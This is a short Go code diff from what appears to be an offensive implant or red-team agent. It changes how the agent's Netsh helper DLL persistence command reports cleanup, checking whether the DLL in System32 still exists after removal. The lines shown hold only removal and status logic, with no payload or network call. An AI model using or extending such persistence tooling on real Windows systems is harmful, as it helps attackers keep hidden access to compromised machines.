@@ -5,6 +5,7 @@ package commands
 
 import (
 	"fmt"
+	"io"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -273,11 +274,12 @@ func persistNetshHelper(args persistArgs) structs.CommandResult {
 
 		// Remove DLL from System32
 		dllPath := filepath.Join(`C:\Windows\System32`, dllName)
-		if err := secureRemove(dllPath); err != nil {
-			return successf("Netsh helper registry removed, but DLL cleanup failed:\n"+
+		secureRemove(dllPath)
+		if _, err := os.Stat(dllPath); err == nil {
+			return successf("Netsh helper registry removed, but DLL still exists:\n"+
 				"  Registry: %s removed\n"+
-				"  DLL:      %s (removal failed: %v)",
-				args.Name, dllPath, err)
+				"  DLL:      %s (removal failed — file still present)",
+				args.Name, dllPath)
 		}
 
 		return successf("Netsh helper DLL persistence removed:\n"+
